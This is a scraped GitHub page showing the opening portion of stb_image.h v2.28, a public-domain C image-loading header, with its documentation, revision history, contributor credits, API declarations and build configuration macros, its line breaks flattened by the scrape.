  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_image.h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nothings%2Fstb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nothings](/nothings)
/
**[stb](/nothings/stb)**
Public

* [Notifications](/login?return_to=%2Fnothings%2Fstb) You must be signed in to change notification settings
* [Fork
  7.7k](/login?return_to=%2Fnothings%2Fstb)
* [Star
   27.5k](/login?return_to=%2Fnothings%2Fstb)

* [Code](/nothings/stb)
* [Issues
  158](/nothings/stb/issues)
* [Pull requests
  131](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects
  0](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

Additional navigation options

* [Code](/nothings/stb)
* [Issues](/nothings/stb/issues)
* [Pull requests](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

## Files

 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_image.h

Copy path Blame  Blame
## Latest commit

## History

[History](/nothings/stb/commits/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)7987 lines (7103 loc) · 278 KB 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_image.h

Top
## File metadata and controls

* Code
* Blame

7987 lines (7103 loc) · 278 KB[Raw](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000/\* stb\_image - v2.28 - public domain image loader - http://nothings.org/stb no warranty implied; use at your own risk
 Do this: #define STB\_IMAGE\_IMPLEMENTATION before you include this file in \*one\* C or C++ file to create the implementation.
 // i.e. it should look like this: #include ... #include ... #include ... #define STB\_IMAGE\_IMPLEMENTATION #include "stb\_image.h"
 You can #define STBI\_ASSERT(x) before the #include to avoid using assert.h. And #define STBI\_MALLOC, STBI\_REALLOC, and STBI\_FREE to avoid using malloc,realloc,free
 QUICK NOTES: Primarily of interest to game developers and other people who can avoid problematic images and only need the trivial interface
 JPEG baseline & progressive (12 bpc/arithmetic not supported, same as stock IJG lib) PNG 1/2/4/8/16-bit-per-channel
 TGA (not sure what subset, if a subset) BMP non-1bpp, non-RLE PSD (composited view only, no extra channels, 8/16 bit-per-channel)
 GIF (\*comp always reports as 4-channel) HDR (radiance rgbE format) PIC (Softimage PIC) PNM (PPM and PGM binary only)
 Animated GIF still needs a proper API, but here's one way to do it: http://gist.github.com/urraka/685d9a6340b26b830d49
 - decode from memory or through FILE (define STBI\_NO\_STDIO to remove code) - decode from arbitrary I/O callbacks - SIMD acceleration on x86/x64 (SSE2) and ARM (NEON)
 Full documentation under "DOCUMENTATION" below.
LICENSE
 See end of file for license information.
RECENT REVISION HISTORY:
 2.28 (2023-01-29) many error fixes, security errors, just tons of stuff 2.27 (2021-07-11) document stbi\_info better, 16-bit PNM support, bug fixes 2.26 (2020-07-13) many minor fixes 2.25 (2020-02-02) fix warnings 2.24 (2020-02-02) fix warnings; thread-local failure\_reason and flip\_vertically 2.23 (2019-08-11) fix clang static analysis warning 2.22 (2019-03-04) gif fixes, fix warnings 2.21 (2019-02-25) fix typo in comment 2.20 (2019-02-07) support utf8 filenames in Windows; fix warnings and platform ifdefs 2.19 (2018-02-11) fix warning 2.18 (2018-01-30) fix warnings 2.17 (2018-01-29) bugfix, 1-bit BMP, 16-bitness query, fix warnings 2.16 (2017-07-23) all functions have 16-bit variants; optimizations; bugfixes 2.15 (2017-03-18) fix png-1,2,4; all Imagenet JPGs; no runtime SSE detection on GCC 2.14 (2017-03-03) remove deprecated STBI\_JPEG\_OLD; fixes for Imagenet JPGs 2.13 (2016-12-04) experimental 16-bit API, only for PNG so far; fixes 2.12 (2016-04-02) fix typo in 2.11 PSD fix that caused crashes 2.11 (2016-04-02) 16-bit PNGS; enable SSE2 in non-gcc x64 RGB-format JPEG; remove white matting in PSD; allocate large structures on the stack; correct channel count for PNG & BMP 2.10 (2016-01-22) avoid warning introduced in 2.09 2.09 (2016-01-16) 16-bit TGA; comments in PNM files; STBI\_REALLOC\_SIZED
 See end of file for full revision history.
 ============================ Contributors =========================
 Image formats Extensions, features Sean Barrett (jpeg, png, bmp) Jetro Lauha (stbi\_info) Nicolas Schulz (hdr, psd) Martin "SpartanJ" Golini (stbi\_info) Jonathan Dummer (tga) James "moose2000" Brown (iPhone PNG) Jean-Marc Lienher (gif) Ben "Disch" Wenger (io callbacks) Tom Seddon (pic) Omar Cornut (1/2/4-bit PNG) Thatcher Ulrich (psd) Nicolas Guillemot (vertical flip) Ken Miller (pgm, ppm) Richard Mitton (16-bit PSD) github:urraka (animated gif) Junggon Kim (PNM comments) Christopher Forseth (animated gif) Daniel Gibson (16-bit TGA) socks-the-fox (16-bit PNG) Jeremy Sawicki (handle all ImageNet JPGs) Optimizations & bugfixes Mikhail Morozov (1-bit BMP) Fabian "ryg" Giesen Anael Seghezzi (is-16-bit query) Arseny Kapoulkine Simon Breuss (16-bit PNM) John-Mark Allen Carmelo J Fdez-Aguera
 Bug & warning fixes Marc LeBlanc David Woo Guillaume George Martins Mozeiko Christpher Lloyd Jerry Jansson Joseph Thomson Blazej Dariusz Roszkowski Phil Jordan Dave Moore Roy Eltham Hayaki Saito Nathan Reed Won Chun Luke Graham Johan Duparc Nick Verigakis the Horde3D community Thomas Ruf Ronny Chevalier github:rlyeh Janez Zemva John Bartholomew Michal Cichon github:romigrou Jonathan Blow Ken Hamada Tero Hanninen github:svdijk Eugene Golushkov Laurent Gomila Cort Stratton github:snagar Aruelien Pocheville Sergio Gonzalez Thibault Reuille github:Zelex Cass Everitt Ryamond Barbiero github:grim210 Paul Du Bois Engin Manap Aldo Culquicondor github:sammyhw Philipp Wiesemann Dale Weiler Oriol Ferrer Mesia github:phprus Josh Tobin Neil Bickford Matthew Gregan github:poppolopoppo Julian Raschke Gregory Mullen Christian Floisand github:darealshinji Baldur Karlsson Kevin Schmidt JR Smith github:Michaelangel007 Brad Weinberger Matvey Cherevko github:mosra Luca Sas Alexander Veselov Zack Middleton [reserved] Ryan C. Gordon [reserved] [reserved] DO NOT ADD YOUR NAME HERE
 Jacko Dirks
 To add your name to the credits, pick a random blank space in the middle and fill it. 80% of merge conflicts on stb PRs are due to people adding their name at the end of the credits.\*/
#ifndef STBI\_INCLUDE\_STB\_IMAGE\_H#define STBI\_INCLUDE\_STB\_IMAGE\_H
// DOCUMENTATION//// Limitations:// - no 12-bit-per-channel JPEG// - no JPEGs with arithmetic coding// - GIF always returns \*comp=4//// Basic usage (see HDR discussion below for HDR usage):// int x,y,n;// unsigned char \*data = stbi\_load(filename, &x, &y, &n, 0);// // ... process data if not NULL ...// // ... x = width, y = height, n = # 8-bit components per pixel ...// // ... replace '0' with '1'..'4' to force that many components per pixel// // ... but 'n' will always be the number that it would have been if you said 0// stbi\_image\_free(data);//// Standard parameters:// int \*x -- outputs image width in pixels// int \*y -- outputs image height in pixels// int \*channels\_in\_file -- outputs # of image components in image file// int desired\_channels -- if non-zero, # of image components requested in result//// The return value from an image loader is an 'unsigned char \*' which points// to the pixel data, or NULL on an allocation failure or if the image is// corrupt or invalid. The pixel data consists of \*y scanlines of \*x pixels,// with each pixel consisting of N interleaved 8-bit components; the first// pixel pointed to is top-left-most in the image. There is no padding between// image scanlines or between pixels, regardless of format. The number of// components N is 'desired\_channels' if desired\_channels is non-zero, or// \*channels\_in\_file otherwise. If desired\_channels is non-zero,// \*channels\_in\_file has the number of components that \_would\_ have been// output otherwise. E.g. if you set desired\_channels to 4, you will always// get RGBA output, but you can check \*channels\_in\_file to see if it's trivially// opaque because e.g. there were only 3 channels in the source image.//// An output image with N components has the following components interleaved// in this order in each pixel://// N=#comp components// 1 grey// 2 grey, alpha// 3 red, green, blue// 4 red, green, blue, alpha//// If image loading fails for any reason, the return value will be NULL,// and \*x, \*y, \*channels\_in\_file will be unchanged. The function// stbi\_failure\_reason() can be queried for an extremely brief, end-user// unfriendly explanation of why the load failed. Define STBI\_NO\_FAILURE\_STRINGS// to avoid compiling these strings at all, and STBI\_FAILURE\_USERMSG to get slightly// more user-friendly ones.//// Paletted PNG, BMP, GIF, and PIC images are automatically depalettized.//// To query the width, height and component count of an image without having to// decode the full file, you can use the stbi\_info family of functions://// int x,y,n,ok;// ok = stbi\_info(filename, &x, &y, &n);// // returns ok=1 and sets x, y, n if image is a supported format,// // 0 otherwise.//// Note that stb\_image pervasively uses ints in its public API for sizes,// including sizes of memory buffers. This is now part of the API and thus// hard to change without causing breakage. As a result, the various image// loaders all have certain limits on image size; these differ somewhat// by format but generally boil down to either just under 2GB or just under// 1GB. When the decoded image would be larger than this, stb\_image decoding// will fail.//// Additionally, stb\_image will reject image files that have any of their// dimensions set to a larger value than the configurable STBI\_MAX\_DIMENSIONS,// which defaults to 2\*\*24 = 16777216 pixels. Due to the above memory limit,// the only way to have an image with such dimensions load correctly// is for it to have a rather extreme aspect ratio. Either way, the// assumption here is that such larger images are likely to be malformed// or malicious. If you do need to load an image with individual dimensions// larger than that, and it still fits in the overall size limit, you can// #define STBI\_MAX\_DIMENSIONS on your own to be something larger.//// ===========================================================================//// UNICODE://// If compiling for Windows and you wish to use Unicode filenames, compile// with// #define STBI\_WINDOWS\_UTF8// and pass utf8-encoded filenames. Call stbi\_convert\_wchar\_to\_utf8 to convert// Windows wchar\_t filenames to utf8.//// ===========================================================================//// Philosophy//// stb libraries are designed with the following priorities://// 1. easy to use// 2. easy to maintain// 3. good performance//// Sometimes I let "good performance" creep up in priority over "easy to maintain",// and for best performance I may provide less-easy-to-use APIs that give higher// performance, in addition to the easy-to-use ones. Nevertheless, it's important// to keep in mind that from the standpoint of you, a client of this library,// all you care about is #1 and #3, and stb libraries DO NOT emphasize #3 above all.//// Some secondary priorities arise directly from the first two, some of which// provide more explicit reasons why performance can't be emphasized.//// - Portable ("ease of use")// - Small source code footprint ("easy to maintain")// - No dependencies ("ease of use")//// ===========================================================================//// I/O callbacks//// I/O callbacks allow you to read from arbitrary sources, like packaged// files or some other source. Data read from callbacks are processed// through a small internal buffer (currently 128 bytes) to try to reduce// overhead.//// The three functions you must define are "read" (reads some bytes of data),// "skip" (skips some bytes of data), "eof" (reports if the stream is at the end).//// ===========================================================================//// SIMD support//// The JPEG decoder will try to automatically use SIMD kernels on x86 when// supported by the compiler. For ARM Neon support, you must explicitly// request it.//// (The old do-it-yourself SIMD API is no longer supported in the current// code.)//// On x86, SSE2 will automatically be used when available based on a run-time// test; if not, the generic C versions are used as a fall-back. On ARM targets,// the typical path is to have separate builds for NEON and non-NEON devices// (at least this is true for iOS and Android). Therefore, the NEON support is// toggled by a build flag: define STBI\_NEON to get NEON loops.//// If for some reason you do not want to use any of SIMD code, or if// you have issues compiling it, you can disable it entirely by// defining STBI\_NO\_SIMD.//// ===========================================================================//// HDR image support (disable by defining STBI\_NO\_HDR)//// stb\_image supports loading HDR images in general, and currently the Radiance// .HDR file format specifically. You can still load any file through the existing// interface; if you attempt to load an HDR file, it will be automatically remapped// to LDR, assuming gamma 2.2 and an arbitrary scale factor defaulting to 1;// both of these constants can be reconfigured through this interface://// stbi\_hdr\_to\_ldr\_gamma(2.2f);// stbi\_hdr\_to\_ldr\_scale(1.0f);//// (note, do not use \_inverse\_ constants; stbi\_image will invert them// appropriately).//// Additionally, there is a new, parallel interface for loading files as// (linear) floats to preserve the full dynamic range://// float \*data = stbi\_loadf(filename, &x, &y, &n, 0);//// If you load LDR images through this interface, those images will// be promoted to floating point values, run through the inverse of// constants corresponding to the above://// stbi\_ldr\_to\_hdr\_scale(1.0f);// stbi\_ldr\_to\_hdr\_gamma(2.2f);//// Finally, given a filename (or an open file or memory block--see header// file for details) containing image data, you can query for the "most// appropriate" interface to use (that is, whether the image is HDR or// not), using://// stbi\_is\_hdr(char \*filename);//// ===========================================================================//// iPhone PNG support://// We optionally support converting iPhone-formatted PNGs (which store// premultiplied BGRA) back to RGB, even though they're internally encoded// differently. To enable this conversion, call// stbi\_convert\_iphone\_png\_to\_rgb(1).//// Call stbi\_set\_unpremultiply\_on\_load(1) as well to force a divide per// pixel to remove any premultiplied alpha \*only\* if the image file explicitly// says there's premultiplied data (currently only happens in iPhone images,// and only if iPhone convert-to-rgb processing is on).//// ===========================================================================//// ADDITIONAL CONFIGURATION//// - You can suppress implementation of any of the decoders to reduce// your code footprint by #defining one or more of the following// symbols before creating the implementation.//// STBI\_NO\_JPEG// STBI\_NO\_PNG// STBI\_NO\_BMP// STBI\_NO\_PSD// STBI\_NO\_TGA// STBI\_NO\_GIF// STBI\_NO\_HDR// STBI\_NO\_PIC// STBI\_NO\_PNM (.ppm and .pgm)//// - You can request \*only\* certain decoders and suppress all other ones// (this will be more forward-compatible, as addition of new decoders// doesn't require you to disable them explicitly)://// STBI\_ONLY\_JPEG// STBI\_ONLY\_PNG// STBI\_ONLY\_BMP// STBI\_ONLY\_PSD// STBI\_ONLY\_TGA// STBI\_ONLY\_GIF// STBI\_ONLY\_HDR// STBI\_ONLY\_PIC// STBI\_ONLY\_PNM (.ppm and .pgm)//// - If you use STBI\_NO\_PNG (or \_ONLY\_ without PNG), and you still// want the zlib decoder to be available, #define STBI\_SUPPORT\_ZLIB//// - If you define STBI\_MAX\_DIMENSIONS, stb\_image will reject images greater// than that size (in either width or height) without further processing.// This is to let programs in the wild set an upper bound to prevent// denial-of-service attacks on untrusted data, as one could generate a// valid image of gigantic dimensions and force stb\_image to allocate a// huge block of memory and spend disproportionate time decoding it. By// default this is set to (1 << 24), which is 16777216, but that's still// very big.
#ifndef STBI\_NO\_STDIO#include <stdio.h>#endif // STBI\_NO\_STDIO
#define STBI\_VERSION 1
enum{ STBI\_default = 0, // only used for desired\_channels
 STBI\_grey = 1, STBI\_grey\_alpha = 2, STBI\_rgb = 3, STBI\_rgb\_alpha = 4};
#include <stdlib.h>typedef unsigned char stbi\_uc;typedef unsigned short stbi\_us;
#ifdef \_\_cplusplusextern "C" {#endif
#ifndef STBIDEF#ifdef STB\_IMAGE\_STATIC#define STBIDEF static#else#define STBIDEF extern#endif#endif
////////////////////////////////////////////////////////////////////////////////// PRIMARY API - works on images of any type//
//// load image by filename, open file, or memory buffer//
typedef struct{ int (\*read) (void \*user,char \*data,int size); // fill 'data' with 'size' bytes. return number of bytes actually read void (\*skip) (void \*user,int n); // skip the next 'n' bytes, or 'unget' the last -n bytes if negative int (\*eof) (void \*user); // returns nonzero if we are at end of file/data} stbi\_io\_callbacks;
//////////////////////////////////////// 8-bits-per-channel interface//
STBIDEF stbi\_uc \*stbi\_load\_from\_memory (stbi\_uc const \*buffer, int len , int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_uc \*stbi\_load\_from\_callbacks(stbi\_io\_callbacks const \*clbk , void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
#ifndef STBI\_NO\_STDIOSTBIDEF stbi\_uc \*stbi\_load (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_uc \*stbi\_load\_from\_file (FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);// for stbi\_load\_from\_file, file pointer is left pointing immediately after image#endif
#ifndef STBI\_NO\_GIFSTBIDEF stbi\_uc \*stbi\_load\_gif\_from\_memory(stbi\_uc const \*buffer, int len, int \*\*delays, int \*x, int \*y, int \*z, int \*comp, int req\_comp);#endif
#ifdef STBI\_WINDOWS\_UTF8STBIDEF int stbi\_convert\_wchar\_to\_utf8(char \*buffer, size\_t bufferlen, const wchar\_t\* input);#endif
//////////////////////////////////////// 16-bits-per-channel interface//
STBIDEF stbi\_us \*stbi\_load\_16\_from\_memory (stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_us \*stbi\_load\_16\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
#ifndef STBI\_NO\_STDIOSTBIDEF stbi\_us \*stbi\_load\_16 (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_us \*stbi\_load\_from\_file\_16(FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);#endif
//////////////////////////////////////// float-per-channel interface//#ifndef STBI\_NO\_LINEAR STBIDEF float \*stbi\_loadf\_from\_memory (stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); STBIDEF float \*stbi\_loadf\_from\_callbacks (stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
 #ifndef STBI\_NO\_STDIO STBIDEF float \*stbi\_loadf (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); STBIDEF float \*stbi\_loadf\_from\_file (FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); #endif#endif
#ifndef STBI\_NO\_HDR STBIDEF void stbi\_hdr\_to\_ldr\_gamma(float gamma); STBIDEF void stbi\_hdr\_to\_ldr\_scale(float scale);#endif // STBI\_NO\_HDR
#ifndef STBI\_NO\_LINEAR STBIDEF void stbi\_ldr\_to\_hdr\_gamma(float gamma); STBIDEF void stbi\_ldr\_to\_hdr\_scale(float scale);#endif // STBI\_NO\_LINEAR
// stbi\_is\_hdr is always defined, but always returns false if STBI\_NO\_HDRSTBIDEF int stbi\_is\_hdr\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user);STBIDEF int stbi\_is\_hdr\_from\_memory(stbi\_uc const \*buffer, int len);#ifndef STBI\_NO\_STDIOSTBIDEF int stbi\_is\_hdr (char const \*filename);STBIDEF int stbi\_is\_hdr\_from\_file(FILE \*f);#endif // STBI\_NO\_STDIO
// get a VERY brief reason for failure// on most compilers (and ALL modern mainstream compilers) this is threadsafeSTBIDEF const char \*stbi\_failure\_reason (void);
// free the loaded image -- this is just free()STBIDEF void stbi\_image\_free (void \*retval\_from\_stbi\_load);
// get image dimensions & components without fully decodingSTBIDEF int stbi\_info\_from\_memory(stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*comp);STBIDEF int stbi\_info\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*comp);STBIDEF int stbi\_is\_16\_bit\_from\_memory(stbi\_uc const \*buffer, int len);STBIDEF int stbi\_is\_16\_bit\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user);
#ifndef STBI\_NO\_STDIOSTBIDEF int stbi\_info (char const \*filename, int \*x, int \*y, int \*comp);STBIDEF int stbi\_info\_from\_file (FILE \*f, int \*x, int \*y, int \*comp);STBIDEF int stbi\_is\_16\_bit (char const \*filename);STBIDEF int stbi\_is\_16\_bit\_from\_file(FILE \*f);#endif
// for image formats that explicitly notate that they have premultiplied alpha,// we just return the colors as stored in the file. set this flag to force// unpremultiplication. results are undefined if the unpremultiply overflow.STBIDEF void stbi\_set\_unpremultiply\_on\_load(int flag\_true\_if\_should\_unpremultiply);
// indicate whether we should process iphone images back to canonical format,// or just pass them through "as-is"STBIDEF void stbi\_convert\_iphone\_png\_to\_rgb(int flag\_true\_if\_should\_convert);
// flip the image vertically, so the first pixel in the output array is the bottom leftSTBIDEF void stbi\_set\_flip\_vertically\_on\_load(int flag\_true\_if\_should\_flip);
// as above, but only applies to images loaded on the thread that calls the function// this function is only available if your compiler supports thread-local variables;// calling it will fail to link if your compiler doesn'tSTBIDEF void stbi\_set\_unpremultiply\_on\_load\_thread(int flag\_true\_if\_should\_unpremultiply);STBIDEF void stbi\_convert\_iphone\_png\_to\_rgb\_thread(int flag\_true\_if\_should\_convert);STBIDEF void stbi\_set\_flip\_vertically\_on\_load\_thread(int flag\_true\_if\_should\_flip);
// ZLIB client - used by PNG, available for other purposes
STBIDEF char \*stbi\_zlib\_decode\_malloc\_guesssize(const char \*buffer, int len, int initial\_size, int \*outlen);STBIDEF char \*stbi\_zlib\_decode\_malloc\_guesssize\_headerflag(const char \*buffer, int len, int initial\_size, int \*outlen, int parse\_header);STBIDEF char \*stbi\_zlib\_decode\_malloc(const char \*buffer, int len, int \*outlen);STBIDEF int stbi\_zlib\_decode\_buffer(char \*obuffer, int olen, const char \*ibuffer, int ilen);
STBIDEF char \*stbi\_zlib\_decode\_noheader\_malloc(const char \*buffer, int len, int \*outlen);STBIDEF int stbi\_zlib\_decode\_noheader\_buffer(char \*obuffer, int olen, const char \*ibuffer, int ilen);
#ifdef \_\_cplusplus}#endif
//////// end header file /////////////////////////////////////////////////////#endif // STBI\_INCLUDE\_STB\_IMAGE\_H
#ifdef STB\_IMAGE\_IMPLEMENTATION
#if defined(STBI\_ONLY\_JPEG) || defined(STBI\_ONLY\_PNG) || defined(STBI\_ONLY\_BMP) \ || defined(STBI\_ONLY\_TGA) || defined(STBI\_ONLY\_GIF) || defined(STBI\_ONLY\_PSD) \ || defined(STBI\_ONLY\_HDR) || defined(STBI\_ONLY\_PIC) || defined(STBI\_ONLY\_PNM) \ || defined(STBI\_ONLY\_ZLIB) #ifndef STBI\_ONLY\_JPEG #define STBI\_NO\_JPEG #endif #ifndef STBI\_ONLY\_PNG #define STBI\_NO\_PNG #endif #ifndef STBI\_ONLY\_BMP #define STBI\_NO\_BMP #endif #ifndef STBI\_ONLY\_PSD #define STBI\_NO\_PSD #endif #ifndef STBI\_ONLY\_TGA #define STBI\_NO\_TGA #endif #ifndef STBI\_ONLY\_GIF #define STBI\_NO\_GIF #endif #ifndef STBI\_ONLY\_HDR #define STBI\_NO\_HDR #endif #ifndef STBI\_ONLY\_PIC #define STBI\_NO\_PIC #endif #ifndef STBI\_ONLY\_PNM #define STBI\_NO\_PNM #endif#endif
#if defined(STBI\_NO\_PNG) && !defined(STBI\_SUPPORT\_ZLIB) && !defined(STBI\_NO\_ZLIB)#define STBI\_NO\_ZLIB#endif
#include <stdarg.h>#include <stddef.h> // ptrdiff\_t on osx#include <stdlib.h>#include <string.h>#include <limits.h>
#if !defined(STBI\_NO\_LINEAR) || !defined(STBI\_NO\_HDR)#include <math.h> // ldexp, pow#endif
#ifndef STBI\_NO\_STDIO#include <stdio.h>#endif
#ifndef STBI\_ASSERT#include <assert.h>#define STBI\_ASSERT(x) assert(x)#endif
#ifdef \_\_cplusplus#define STBI\_EXTERN extern "C"#else#define STBI\_EXTERN extern#endif
#ifndef \_MSC\_VER #ifdef \_\_cplusplus #define stbi\_inline inline #else #define stbi\_inline #endif#else #define stbi\_inline \_\_forceinline#endif
#ifndef STBI\_NO\_THREAD\_LOCALS #if defined(\_\_cplusplus) && \_\_cplusplus >= 201103L #define STBI\_THREAD\_LOCAL thread\_local #elif defined(\_\_GNUC\_\_) && \_\_GNUC\_\_ < 5 #define STBI\_THREAD\_LOCAL \_\_thread #elif defined(\_MSC\_VER) #define STBI\_THREAD\_LOCAL \_\_declspec(thread) #elif defined (\_\_STDC\_VERSION\_\_) && \_\_STDC\_VERSION\_\_ >= 201112L && !defined(\_\_STDC\_NO\_THREADS\_\_) #define STBI\_THREAD\_LOCAL \_Thread\_local #endif
 #ifndef STBI\_THREAD\_LOCAL #if defined(\_\_GNUC\_\_) #define STBI\_THREAD\_LOCAL \_\_thread #endif #endif#endif
#if defined(\_MSC\_VER) || defined(\_\_SYMBIAN32\_\_)typedef unsigned short stbi\_\_uint16;typedef signed short stbi\_\_int16;typedef unsigned int stbi\_\_uint32;typedef signed int stbi\_\_int32;#else#include <stdint.h>typedef uint16\_t stbi\_\_uint16;typedef int16\_t stbi\_\_int16;typedef uint32\_t stbi\_\_uint32;typedef int32\_t stbi\_\_int32;#endif
// should produce compiler error if size is wrongtypedef unsigned char validate\_uint32[sizeof(stbi\_\_uint32)==4 ? 1 : -1];
#ifdef \_MSC\_VER#define STBI\_NOTUSED(v) (void)(v)#else#define STBI\_NOTUSED(v) (void)sizeof(v)#endif
#ifdef \_MSC\_VER#define STBI\_HAS\_LROTL#endif
#ifdef STBI\_HAS\_LROTL #define stbi\_lrot(x,y) \_lrotl(x,y)#else #define stbi\_lrot(x,y) (((x) << (y)) | ((x) >> (-(y) & 31)))#endif
#if defined(STBI\_MALLOC) && defined(STBI\_FREE) && (defined(STBI\_REALLOC) || defined(STBI\_REALLOC\_SIZED))// ok#elif !defined(STBI\_MALLOC) && !defined(STBI\_FREE) && !defined(STBI\_REALLOC) && !defined(STBI\_REALLOC\_SIZED)// ok#else#error "Must define all or none of STBI\_MALLOC, STBI\_FREE, and STBI\_REALLOC (or STBI\_REALLOC\_SIZED)."#endif
#ifndef STBI\_MALLOC#define STBI\_MALLOC(sz) malloc(sz)#define STBI\_REALLOC(p,newsz) realloc(p,newsz)#define STBI\_FREE(p) free(p)#endif
#ifndef STBI\_REALLOC\_SIZED#define STBI\_REALLOC\_SIZED(p,oldsz,newsz) STBI\_REALLOC(p,newsz)#endif
// x86/x64 detection#if defined(\_\_x86\_64\_\_) || defined(\_M\_X64)#define STBI\_\_X64\_TARGET#elif defined(\_\_i386) || defined(\_M\_IX86)#define STBI\_\_X86\_TARGET#endif
#if defined(\_\_GNUC\_\_) && defined(STBI\_\_X86\_TARGET) && !defined(\_\_SSE2\_\_) && !defined(STBI\_NO\_SIMD)// gcc doesn't support sse2 intrinsics unless you compile with -msse2,// which in turn means it gets to use SSE2 everywhere. This is unfortunate,// but previous attempts to provide the SSE2 functions with runtime// detection caused numerous issues. The way architecture extensions are// exposed in GCC/Clang is, sadly, not really suited for one-file libs.// New behavior: if compiled with -msse2, we use SSE2 without any// detection; if not, we don't use it at all.#define STBI\_NO\_SIMD#endif
